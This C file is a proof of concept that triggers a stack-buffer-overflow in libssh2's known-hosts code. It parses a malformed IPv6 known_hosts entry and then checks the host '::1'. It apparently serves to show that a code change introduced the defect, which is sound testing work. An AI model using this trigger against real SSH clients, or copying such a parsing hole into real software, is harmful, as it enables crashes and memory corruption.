/* PoC for a memory-safety defect in libssh2's known-hosts IPv6 matching.
 *
 * Drives only the public libssh2 known-hosts API with in-contract input:
 * an attacker-influenced known_hosts entry is parsed with
 * libssh2_knownhost_readline(), then a normal host is verified with
 * libssh2_knownhost_check().  While comparing the stored plain entry against
 * the checked host, libssh2 parses the stored IPv6 literal and writes past the
 * end of its fixed 8-word stack accumulator.
 *
 * On the original maintenance batch this input is rejected cleanly
 * (CHECK_NOTFOUND).  On the resulting tree AddressSanitizer aborts with a
 * stack-buffer-overflow while parsing the stored entry.
 */

#include <libssh2.h>

#include <stdio.h>
#include <string.h>

int main(void)
{
    LIBSSH2_SESSION *session;
    LIBSSH2_KNOWNHOSTS *hosts;
    struct libssh2_knownhost *match = NULL;
    int rc;

    /* An IPv6 literal with seven 16-bit groups followed by an embedded IPv4
       tail - a syntactically malformed (nine-group) address that the parser
       is expected to reject.  This is ordinary untrusted known_hosts data. */
    static const char line[] =
        "1:2:3:4:5:6:7:1.2.3.4 ssh-rsa "
        "AAAAB3NzaC1yc2EAAAADAQABAAABAQDexampleexamplekey";

    /* A perfectly valid IPv6 host to verify against; this makes the matcher
       proceed to compare it with the stored entry above. */
    static const char checkhost[] = "::1";
    static const char key[] =
        "AAAAB3NzaC1yc2EAAAADAQABAAABAQDexampleexamplekey";

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init failed\n");
        return 2;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "libssh2_session_init failed\n");
        return 2;
    }

    hosts = libssh2_knownhost_init(session);
    if(!hosts) {
        fprintf(stderr, "libssh2_knownhost_init failed\n");
        return 2;
    }

    rc = libssh2_knownhost_readline(hosts, line, strlen(line),
                                    LIBSSH2_KNOWNHOST_FILE_OPENSSH);
    if(rc) {
        fprintf(stderr, "readline failed: %d\n", rc);
        return 2;
    }

    /* The overflow happens inside this call while parsing the stored entry. */
    rc = libssh2_knownhost_check(hosts, checkhost, key, strlen(key),
                                 LIBSSH2_KNOWNHOST_TYPE_PLAIN |
                                 LIBSSH2_KNOWNHOST_KEYENC_BASE64 |
                                 LIBSSH2_KNOWNHOST_KEY_SSHRSA,
                                 &match);

    fprintf(stderr, "check returned %d (no overflow detected)\n", rc);

    libssh2_knownhost_free(hosts);
    libssh2_session_free(session);
    libssh2_exit();
    return 0;
}
